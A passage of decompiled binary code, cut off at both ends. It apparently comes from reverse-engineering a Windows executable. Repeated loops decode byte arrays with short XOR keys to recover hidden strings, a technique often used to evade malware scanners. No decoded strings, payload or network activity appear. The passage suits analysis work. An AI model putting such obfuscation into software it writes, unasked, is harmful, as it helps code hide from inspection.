 } while (iVar8 < 0x20);\n    fcn.0040b1a3();\n    var_20h._0_2_ = 0x3501;\n    var_20h._2_1_ = 0x7d;\n    var_20h._3_1_ = 0x14;\n    var_1ch._0_1_ = 0x55;\n    var_1ch._1_1_ = 10;\n    var_1ch._2_2_ = 0x5454;\n    var_18h._0_2_ = 0x3521;\n    var_18h._2_1_ = 0x76;\n    var_18h._3_1_ = 0x1b;\n    var_14h._0_1_ = 0x45;\n    var_14h._1_1_ = 0x1d;\n    var_14h._2_1_ = 0x61;\n    var_14h._3_1_ = 0x47;\n    var_10h._0_1_ = 0x3b;\n    var_10h._1_1_ = 0x3f;\n    var_10h._2_1_ = 0x46;\n    var_10h._3_1_ = 0x13;\n    var_ch._0_1_ = 0x42;\n    var_ch._1_1_ = 1;\n    var_ch._2_1_ = 0x61;\n    var_ch._3_1_ = 0x47;\n    var_8h._0_1_ = 0x3b;\n    var_8h._1_1_ = 0x26;\n    var_8h._2_1_ = 0x5d;\n    var_8h._3_1_ = 0x16;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x1f;\n    var_4h._2_1_ = 0x54;\n    var_4h._3_1_ = 0x35;\n    var_2ch._0_1_ = 0x52;\n    var_2ch._1_2_ = 0x3450;\n    var_2ch._3_1_ = 0x7a;\n    var_28h._0_1_ = 0x36;\n    var_28h._1_1_ = 0x78;\n    var_28h._2_1_ = 0x31;\n    var_28h._3_1_ = 0x35;\n    fcn.00401000(0x20);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_44h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_20h - var_44h];\n    } while (uVar7 < 0x20);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 0x3a;\n    var_1ch._1_1_ = 0x2a;\n    var_1ch._2_2_ = 0x4636;\n    var_18h._0_2_ = 0x3402;\n    var_18h._2_1_ = 0x3c;\n    var_18h._3_1_ = 0xc;\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 0x14;\n    var_14h._2_1_ = 0x53;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x33;\n    var_10h._1_1_ = 0x21;\n    var_10h._2_1_ = 5;\n    var_10h._3_1_ = 0x2a;\n    var_ch._0_1_ = 0x25;\n    var_ch._1_1_ = 0x46;\n    var_ch._2_1_ = 0xe;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0x21;\n    var_8h._1_1_ = 5;\n    var_8h._2_1_ = 0x2a;\n    var_8h._3_1_ = 0x12;\n    var_4h._0_1_ = 0x51;\n    var_4h._1_1_ = 0x67;\n    var_b4h = 0x34754f69;\n    var_b0h._0_2_ = 0x5567;\n    var_b0h._2_1_ = 0x48;\n    fcn.00401000(0x1a);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_e8h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_b4h + iVar6) ^ puVar1[&var_1ch - var_e8h];\n    } while (iVar8 < 0x1a);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 4;\n    var_1ch._1_1_ = 3;\n    var_1ch._2_2_ = 0x405;\n    var_18h._0_2_ = 0x82c;\n    var_18h._2_1_ = 0x2d;\n    var_18h._3_1_ = 0x2d;\n    var_14h._0_1_ = 7;\n    var_14h._1_1_ = 3;\n    var_14h._2_1_ = 0x34;\n    var_14h._3_1_ = 0x1b;\n    var_10h._0_1_ = 0x28;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0x23;\n    var_ch._1_1_ = 0x36;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 0x3f;\n    var_8h._1_1_ = 0;\n    var_8h._2_1_ = 0x35;\n    var_8h._3_1_ = 0x2d;\n    var_4h._0_1_ = 0x30;\n    var_4h._1_1_ = 3;\n    var_4h._2_1_ = 0x46;\n    var_2ch._0_1_ = 0x57;\n    var_2ch._1_2_ = 0x4666;\n    var_2ch._3_1_ = 0x76;\n    var_28h._0_1_ = 0x49;\n    var_28h._1_1_ = 0x69;\n    var_28h._2_1_ = 0x59;\n    var_28h._3_1_ = 0x48;\n    var_10h._1_1_ = var_14h;\n    fcn.00401000(0x1b);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_b4h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_1ch - var_b4h];\n    } while (uVar7 < 0x1b);\n    fcn.0040b1a3();\n    var_14h._0_1_ = 0x3d;\n    var_14h._1_1_ = 0x23;\n    var_14h._2_1_ = 0x18;\n    var_14h._3_1_ = 0x20;\n    var_10h._0_1_ = 0x5b;\n    var_10h._1_1_ = 0x5a;\n    var_10h._2_1_ = 0x23;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x3e;\n    var_ch._1_1_ = 0x34;\n    var_ch._2_1_ = 0x33;\n    var_ch._3_1_ = 0x37;\n    var_8h._0_1_ = 0x51;\n    var_8h._1_1_ = 0x5d;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 0x2e;\n    var_4h._0_1_ = 0xb;\n    var_4h._1_1_ = 0x46;\n    var_2ch._0_1_ = 0x6e;\n    var_2ch._1_2_ = 0x5a46;\n    var_2ch._3_1_ = 0x41;\n    var_28h._0_1_ = 0x38;\n    var_28h._1_1_ = 0x31;\n    var_28h._2_1_ = 0x56;\n    var_28h._3_1_ = 0x49;\n    fcn.00401000(0x12);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_e0h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_14h - var_e0h];\n    } while (uVar7 < 0x12);\n    fcn.0040b1a3();\n    var_14h._0_1_ = 0xb;\n    var_14h._1_1_ = 0x23;\n    var_14h._2_1_ = 0x1c;\n    var_14h._3_1_ = 0x23;\n    var_10h._0_1_ = 6;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0x2a;\n    var_10h._3_1_ = 0x2a;\n    var_ch._0_1_ = 0x23;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0x34;\n    var_ch._3_1_ = 0x1c;\n    var_8h._0_1_ = 0x31;\n    var_8h._1_1_ = 0x2c;\n    var_8h._2_1_ = 0x34;\n    var_8h._3_1_ = 0x23;\n    var_4h._0_1_ = 0x29;\n    var_4h._1_1_ = 0x23;\n    var_4h._2_1_ = 0x75;\n    var_c4h = 0x464e4658;\n    var_c0h._0_2_ = 0x4775;\n    var_c0h._2_1_ = 0x45;\n    fcn.00401000(0x13);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_ech;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_c4h + iVar6) ^ puVar1[&var_14h - var_ech];\n    } while (iVar8 < 0x13);\n    fcn.0040b1a3();\n    var_14h._0_1_ = 0x32;\n    var_14h._1_1_ = 0x15;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x26;\n    var_10h._1_1_ = 3;\n    var_10h._2_1_ = 0x2d;\n    var_10h._3_1_ = 8;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0x3e;\n    var_ch._3_1_ = 0x10;\n    var_8h._0_1_ = 0x3a;\n    var_8h._1_1_ = 1;\n    var_8h._2_1_ = 0x20;\n    var_8h._3_1_ = 0xb;\n    var_4h._0_1_ = 4;\n    var_4h._1_1_ = 0x17;\n    var_4h._2_1_ = 0xb;\n    var_4h._3_1_ = 0x62;\n    var_2ch._0_1_ = 0x61;\n    var_2ch._1_2_ = 0x6e70;\n    var_2ch._3_1_ = 0x62;\n    var_28h._0_1_ = 0x53;\n    var_28h._1_1_ = 0x77;\n    var_28h._2_1_ = 0x49;\n    var_28h._3_1_ = 0x67;\n    fcn.00401000(0x14);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_c4h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_14h - var_c4h];\n    } while (uVar7 < 0x14);\n    fcn.0040b1a3();\n    var_34h = 0x2255707;\n    var_30h._0_1_ = 0x26;\n    var_30h._1_1_ = 0x2d;\n    var_30h._2_1_ = 0xc;\n    var_30h._3_1_ = 4;\n    var_2ch._0_1_ = 0x40;\n    var_2ch._1_2_ = 0x1108;\n    var_2ch._3_1_ = 0x2d;\n    var_28h._0_1_ = 0x34;\n    var_28h._1_1_ = 0xe;\n    var_28h._2_1_ = 0x33;\n    var_28h._3_1_ = 0x57;\n    var_24h = 0x61;\n    var_74h = 0x67613254;\n    var_70h._0_2_ = 0x5844;\n    var_70h._2_1_ = 0x6b;\n    fcn.00401000(0x11);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_110h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_74h + iVar6) ^ puVar1[&var_34h - var_110h];\n    } while (iVar8 < 0x11);\n    fcn.0040b1a3();\n    var_34h = 0x420b0e3d;\n    var_30h._0_1_ = 0x52;\n    var_30h._1_1_ = 0x21;\n    var_30h._2_1_ = 0x26;\n    var_30h._3_1_ = 0x3e;\n    var_2ch._0_1_ = 0x19;\n    var_2ch._1_2_ = 0x4123;\n    var_2ch._3_1_ = 0x5f;\n    var_28h._0_1_ = 0x24;\n    var_28h._1_1_ = 0x37;\n    var_28h._2_1_ = 9;\n    var_28h._3_1_ = 0xe;\n    var_24h = 0x4a;\n    var_a4h = 0x374a6b6e;\n    var_a0h._0_2_ = 0x4836;\n    var_a0h._2_1_ = 0x52;\n    fcn.00401000(0x11);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_74h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_a4h + iVar6) ^ puVar1[&var_34h - var_74h];\n    } while (iVar8 < 0x11);\n    fcn.0040b1a3();\n    var_20h._0_2_ = 0x1017;\n    var_20h._2_1_ = 0x16;\n    var_20h._3_1_ = 0x11;\n    var_1ch._0_1_ = 0x3d;\n    var_1ch._1_1_ = 0x1d;\n    var_1ch._2_2_ = 0x2926;\n    var_18h._0_2_ = 0x2b30;\n    var_18h._2_1_ = 0x1e;\n    var_18h._3_1_ = 0x27;\n    var_14h._0_1_ = 0x1b;\n    var_14h._1_1_ = 0x2c;\n    var_14h._2_1_ = 0x2a;\n    var_14h._3_1_ = 0x18;\n    var_10h._0_1_ = 0x20;\n    var_10h._1_1_ = 6;\n    var_10h._2_1_ = 0x3a;\n    var_10h._3_1_ = 0x39;\n    var_ch._0_1_ = 0x31;\n    var_ch._1_1_ = 0x2d;\n    var_ch._2_1_ = 3;\n    var_ch._3_1_ = 0x2c;\n    var_8h._0_1_ = 4;\n    var_8h._1_1_ = 0x2b;\n    var_8h._2_1_ = 0xe;\n    var_8h._3_1_ = 0x26;\n    var_4h._0_1_ = 0x44;\n    var_64h = 0x68457544;\n    var_60h._0_2_ = 0x694e;\n    var_60h._2_1_ = 0x43;\n    fcn.00401000(0x1d);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_a4h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_64h + iVar6) ^ puVar1[&var_20h - var_a4h];\n    } while (iVar8 < 0x1d);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0x573b;\n    var_18h._2_1_ = 0x32;\n    var_18h._3_1_ = 0x3e;\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 0x22;\n    var_14h._2_1_ = 0x17;\n    var_14h._3_1_ = 0x35;\n    var_10h._0_1_ = 0x26;\n    var_10h._1_1_ = 0x5d;\n    var_10h._2_1_ = 5;\n    var_10h._3_1_ = 0x3f;\n    var_ch._0_1_ = 0x12;\n    var_ch._1_1_ = 0x35;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x22;\n    var_8h._0_1_ = 1;\n    var_8h._1_1_ = 0x44;\n    var_8h._2_1_ = 0x18;\n    var_8h._3_1_ = 0x3a;\n    var_4h._0_1_ = 0x11;\n    var_4h._1_1_ = 0x2b;\n    var_4h._2_1_ = 0x15;\n    var_4h._3_1_ = 0x50;\n    var_2ch._0_1_ = 0x68;\n    var_2ch._1_2_ = 0x7132;\n    var_2ch._3_1_ = 0x56;\n    var_28h._0_1_ = 0x74;\n    var_28h._1_1_ = 0x4c;\n    var_28h._2_1_ = 0x70;\n    var_28h._3_1_ = 0x50;\n    fcn.00401000(0x18);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_64h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_18h - var_64h];\n    } while (uVar7 < 0x18);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 99;\n    var_1ch._1_1_ = 0x20;\n    var_1ch._2_2_ = 0x3023;\n    var_18h._0_2_ = 0x1f0e;\n    var_18h._2_1_ = 0x47;\n    var_18h._3_1_ = 0x37;\n    var_14h._0_1_ = 99;\n    var_14h._1_1_ = 0x2d;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 7;\n    var_10h._1_1_ = 0x1f;\n    var_10h._2_1_ = 0x44;\n    var_10h._3_1_ = 0x3c;\n    var_ch._0_1_ = 0x60;\n    var_ch._1_1_ = 0x37;\n    var_ch._2_1_ = 0x18;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 10;\n    var_8h._1_1_ = 0x1c;\n    var_8h._2_1_ = 0x56;\n    var_8h._3_1_ = 0x35;\n    var_4h._0_1_ = 0x55;\n    var_4h._1_1_ = 0x45;\n    var_2ch._0_1_ = 0x30;\n    var_2ch._1_2_ = 0x7145;\n    var_2ch._3_1_ = 0x55;\n    var_28h._0_1_ = 99;\n    var_28h._1_1_ = 0x70;\n    var_28h._2_1_ = 0x33;\n    var_28h._3_1_ = 0x52;\n    fcn.00401000(0x1a);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_10ch;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_1ch - var_10ch];\n    } while (uVar7 < 0x1a);\n    fcn.0040b1a3();\n    var_14h._0_1_ = 0x65;\n    var_14h._1_1_ = 2;\n    var_14h._2_1_ = 0x3f;\n    var_14h._3_1_ = 0x3a;\n    var_10h._0_1_ = 0x2a;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 0x12;\n    var_10h._3_1_ = 0x5d;\n    var_ch._0_1_ = 0x37;\n    var_ch._1_1_ = 0x18;\n    var_ch._2_1_ = 0x3d;\n    var_ch._3_1_ = 0x38;\n    var_8h._0_1_ = 0x10;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 0x53;\n    var_8h._3_1_ = 0;\n    var_4h._0_1_ = 0xf;\n    var_4h._1_1_ = 0x54;\n    var_d4h = 0x546a6736;\n    var_d0h._0_2_ = 0x794e;\n    var_d0h._2_1_ = 0x71;\n    fcn.00401000(0x12);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_fch;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_d4h + iVar6) ^ puVar1[&var_14h - var_fch];\n    } while (iVar8 < 0x12);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0x2714;\n    var_18h._2_1_ = 0x60;\n    var_18h._3_1_ = 0x33;\n    var_14h._0_1_ = 0x26;\n    var_14h._1_1_ = 7;\n    var_14h._2_1_ = 0x2e;\n    var_14h._3_1_ = 0x28;\n    var_10h._0_1_ = 0x22;\n    var_10h._1_1_ = 0x2c;\n    var_10h._2_1_ = 0x47;\n    var_10h._3_1_ = 0x1a;\n    var_ch._0_1_ = 0x3a;\n    var_ch._1_1_ = 0xd;\n    var_ch._2_1_ = 0x19;\n    var_ch._3_1_ = 0x26;\n    var_8h._0_1_ = 0x2b;\n    var_8h._1_1_ = 0x27;\n    var_8h._2_1_ = 0x54;\n    var_8h._3_1_ = 0x2f;\n    var_4h._0_1_ = 0x48;\n    var_2ch._0_1_ = 0x47;\n    var_2ch._1_2_ = 0x3342;\n    var_2ch._3_1_ = 0x4a;\n    var_28h._0_1_ = 0x48;\n    var_28h._1_1_ = 100;\n    var_28h._2_1_ = 0x6f;\n    var_28h._3_1_ = 0x4f;\n    fcn.00401000(0x15);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_d4h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_18h - var_d4h];\n    } while (uVar7 < 0x15);\n    fcn.0040b1a3();\n    var_1ch._0_1_ = 9;\n    var_1ch._1_1_ = 0x34;\n    var_1ch._2_2_ = 0x2b00;\n    var_18h._0_2_ = 0x5117;\n    var_18h._2_1_ = 0x3a;\n    var_18h._3_1_ = 0x3f;\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 0x20;\n    var_14h._2_1_ = 0x29;\n    var_14h._3_1_ = 0x13;\n    var_10h._0_1_ = 0x54;\n    var_10h._1_1_ = 0x37;\n    var_10h._2_1_ = 0x2e;\n    var_10h._3_1_ = 0x38;\n    var_ch._0_1_ = 0x2a;\n    var_ch._1_1_ = 0x2b;\n    var_ch._2_1_ = 0x26;\n    var_ch._3_1_ = 0x41;\n    var_8h._0_1_ = 0x3f;\n    var_8h._1_1_ = 0x2c;\n    var_8h._2_1_ = 0x38;\n    var_8h._3_1_ = 0x29;\n    var_4h._0_1_ = 0x20;\n    var_4h._1_1_ = 0x11;\n    var_4h._2_1_ = 0x56;\n    var_4h._3_1_ = 0x56;\n    var_54h = 0x4545515a;\n    var_50h._0_2_ = 0x3376;\n    var_50h._2_1_ = 0x56;\n    fcn.00401000(0x1c);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_f0h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_54h + iVar6) ^ puVar1[&var_1ch - var_f0h];\n    } while (iVar8 < 0x1c);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0x1636;\n    var_18h._2_1_ = 10;\n    var_18h._3_1_ = 0x32;\n    var_14h._0_1_ = 0x17;\n    var_14h._1_1_ = 0x59;\n    var_14h._2_1_ = 0x15;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 0x25;\n    var_10h._1_1_ = 0x28;\n    var_10h._2_1_ = 0x3f;\n    var_10h._3_1_ = 0xc;\n    var_ch._0_1_ = 0x55;\n    var_ch._1_1_ = 0x17;\n    var_ch._2_1_ = 0x35;\n    var_ch._3_1_ = 1;\n    var_8h._0_1_ = 0x2e;\n    var_8h._1_1_ = 0x25;\n    var_8h._2_1_ = 0x10;\n    var_8h._3_1_ = 0x54;\n    var_4h._0_1_ = 0x17;\n    var_4h._1_1_ = 2;\n    var_4h._2_1_ = 0x16;\n    var_4h._3_1_ = 0x47;\n    var_94h = 0x53477365;\n    var_90h._0_2_ = 0x3879;\n    var_90h._2_1_ = 0x72;\n    fcn.00401000(0x18);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_54h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_94h + iVar6) ^ puVar1[&var_18h - var_54h];\n    } while (iVar8 < 0x18);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0x1f39;\n    var_18h._2_1_ = 0x33;\n    var_18h._3_1_ = 0x1b;\n    var_14h._0_1_ = 0x27;\n    var_14h._1_1_ = 0x26;\n    var_14h._2_1_ = 0x31;\n    var_14h._3_1_ = 0x27;\n    var_10h._0_1_ = 5;\n    var_10h._1_1_ = 0x14;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 2;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x13;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 0x3d;\n    var_8h._0_1_ = 0x1c;\n    var_8h._1_1_ = 0x13;\n    var_8h._2_1_ = 0x16;\n    var_8h._3_1_ = 0x13;\n    var_4h._0_1_ = 0x30;\n    var_4h._1_1_ = 0x26;\n    var_4h._2_1_ = 0x43;\n    var_2ch._0_1_ = 0x6a;\n    var_2ch._1_2_ = 0x7a7a;\n    var_2ch._3_1_ = 0x76;\n    var_28h._0_1_ = 0x57;\n    var_28h._1_1_ = 0x43;\n    var_28h._2_1_ = 0x43;\n    var_28h._3_1_ = 0x54;\n    fcn.00401000(0x17);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_94h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_18h - var_94h];\n    } while (uVar7 < 0x17);\n    fcn.0040b1a3();\n    var_18h._0_2_ = 0x5c26;\n    var_18h._2_1_ = 0x72;\n    var_18h._3_1_ = 0x2b;\n    var_14h._0_1_ = 0x2b;\n    var_14h._1_1_ = 0x19;\n    var_14h._2_1_ = 0x46;\n    var_14h._3_1_ = 0x10;\n    var_10h._0_1_ = 0x7e;\n    var_10h._1_1_ = 0x5d;\n    var_10h._2_1_ = 0x36;\n    var_10h._3_1_ = 0x2c;\n    var_ch._0_1_ = 0x19;\n    var_ch._1_1_ = 0x5e;\n    var_ch._2_1_ = 0x25;\n    var_ch._3_1_ = 0x4b;\n    var_8h._0_1_ = 0x58;\n    var_8h._1_1_ = 0x2f;\n    var_8h._2_1_ = 0x27;\n    var_8h._3_1_ = 0x14;\n    var_4h._0_1_ = 0x57;\n    var_4h._1_1_ = 0x12;\n    var_4h._2_1_ = 0x5c;\n    var_4h._3_1_ = 0x31;\n    var_dch = 0x59313975;\n    var_d8h._0_2_ = 0x784e;\n    var_d8h._2_1_ = 0x32;\n    fcn.00401000(0x18);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_104h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_dch + iVar6) ^ puVar1[&var_18h - var_104h];\n    } while (iVar8 < 0x18);\n    fcn.0040b1a3();\n    var_20h._0_2_ = 0x293b;\n    var_20h._2_1_ = 7;\n    var_20h._3_1_ = 0x17;\n    var_1ch._0_1_ = 0x41;\n    var_1ch._2_2_ = 0x5105;\n    var_18h._0_2_ = 0xf0c;\n    var_18h._2_1_ = 0x21;\n    var_18h._3_1_ = 0;\n    var_14h._0_1_ = 0x50;\n    var_14h._1_1_ = 0x39;\n    var_14h._2_1_ = 0x10;\n    var_14h._3_1_ = 0x5a;\n    var_10h._0_1_ = 0x29;\n    var_10h._1_1_ = 0x2f;\n    var_10h._2_1_ = 0x30;\n    var_10h._3_1_ = 0;\n    var_ch._0_1_ = 0x47;\n    var_ch._2_1_ = 0x21;\n    var_ch._3_1_ = 0x46;\n    var_8h._0_1_ = 1;\n    var_8h._1_1_ = 0x3a;\n    var_8h._2_1_ = 0x3a;\n    var_8h._3_1_ = 9;\n    var_4h._0_1_ = 0x51;\n    var_4h._1_1_ = 0x13;\n    var_4h._2_1_ = 0x14;\n    var_4h._3_1_ = 0x34;\n    var_2ch._0_1_ = 0x68;\n    var_2ch._1_2_ = 0x534c;\n    var_2ch._3_1_ = 0x65;\n    var_28h._0_1_ = 0x34;\n    var_28h._1_1_ = 0x74;\n    var_28h._2_1_ = 0x71;\n    var_28h._3_1_ = 0x34;\n    var_1ch._1_1_ = var_20h._2_1_;\n    var_ch._1_1_ = var_20h._2_1_;\n    fcn.00401000(0x20);\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_dch;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_20h - var_dch];\n    } while (uVar7 < 0x20);\n    fcn.0040b1a3();\n    var_14h._0_1_ = 0x3d;\n    var_14h._1_1_ = 0x20;\n    var_14h._2_1_ = 0x2b;\n    var_14h._3_1_ = 0x30;\n    var_10h._0_1_ = 0x2d;\n    var_10h._1_1_ = 0xc;\n    var_10h._2_1_ = 0x11;\n    var_10h._3_1_ = 0xb;\n    var_ch._0_1_ = 0x29;\n    var_ch._1_1_ = 0x29;\n    var_ch._2_1_ = 0x27;\n    var_ch._3_1_ = 0x28;\n    var_8h._0_1_ = 0x1b;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 2;\n    var_8h._3_1_ = 0x20;\n    var_4h._0_1_ = 0x1e;\n    var_4h._1_1_ = 0x30;\n    var_4h._2_1_ = 0x41;\n    var_84h = 0x5579456e;\n    var_80h._0_2_ = 0x6d41;\n    var_80h._2_1_ = 0x73;\n    fcn.00401000(0x13);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_108h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_84h + iVar6) ^ puVar1[&var_14h - var_108h];\n    } while (iVar8 < 0x13);\n    fcn.0040b1a3();\n    var_20h._0_2_ = 0x5204;\n    var_20h._2_1_ = 0x27;\n    var_20h._3_1_ = 0x16;\n    var_1ch._0_1_ = 0x2f;\n    var_1ch._1_1_ = 5;\n    var_1ch._2_2_ = 0x3613;\n    var_18h._0_2_ = 0xb44;\n    var_18h._2_1_ = 0x2f;\n    var_18h._3_1_ = 0x23;\n    var_14h._0_1_ = 5;\n    var_14h._1_1_ = 0x1d;\n    var_14h._2_1_ = 0x3e;\n    var_14h._3_1_ = 0x59;\n    var_10h._0_1_ = 9;\n    var_10h._1_1_ = 0x2b;\n    var_10h._2_1_ = 0x29;\n    var_10h._3_1_ = 3;\n    var_ch._0_1_ = 0x26;\n    var_ch._1_1_ = 0x25;\n    var_ch._2_1_ = 0x5e;\n    var_ch._3_1_ = 0x18;\n    var_8h._0_1_ = 0x11;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 0x12;\n    var_8h._3_1_ = 0x11;\n    var_4h._0_1_ = 0x32;\n    var_4h._1_1_ = 0x37;\n    var_2ch._0_1_ = 0x57;\n    var_2ch._1_2_ = 0x6e37;\n    var_2ch._3_1_ = 0x78;\n    var_28h._0_1_ = 0x4c;\n    var_28h._1_1_ = 0x77;\n    var_28h._2_1_ = 0x76;\n    fcn.00401000(0x1e);\n    iVar8 = 0;\n    do {\n        puVar1 = iVar8 + var_84h;\n        iVar6 = iVar8 % var_38h;\n        iVar8 = iVar8 + 1;\n        *puVar1 = *(&var_2ch + iVar6) ^ puVar1[&var_20h - var_84h];\n    } while (iVar8 < 0x1e);\n    fcn.0040b1a3();\n    var_14h._0_1_ = 0x6a;\n    var_14h._1_1_ = 0x30;\n    var_14h._2_1_ = 0x21;\n    var_14h._3_1_ = 0x5d;\n    var_10h._0_1_ = 0x29;\n    var_10h._1_1_ = 9;\n    var_10h._2_1_ = 0xc;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x57;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x25;\n    var_ch._3_1_ = 0x46;\n    var_8h._0_1_ = 0x2d;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 0x3f;\n    var_8h._3_1_ = 0x23;\n    var_4h._0_1_ = 0x5c;\n    var_4h._1_1_ = 0x32;\n    var_4h._2_1_ = 0x10;\n    var_4h._3_1_ = 0x34;\n    var_2ch._0_1_ = 0x39;\n    var_2ch._1_2_ = 0x7555;\n    var_2ch._3_1_ = 0x34;\n    var_28h._0_1_ = 0x44;\n    var_28h._1_1_ = 0x6c;\n    var_28h._2_1_ = 0x56;\n    var_28h._3_1_ = 0x4f;\n    fcn.00401000(0x14);\n    iVar8 = var_38h;\n    uVar7 = 0;\n    do {\n        puVar1 = uVar7 + var_38h;\n        uVar5 = uVar7 & 0x80000007;\n        if (uVar5 < 0) {\n            uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_2ch + uVar5) ^ puVar1[&var_14h - var_38h];\n    } while (uVar7 < 0x14);\n    fcn.0040b1a3();\n    var_20h._0_2_ = 0x91e;\n    var_20h._2_1_ = 0x2f;\n    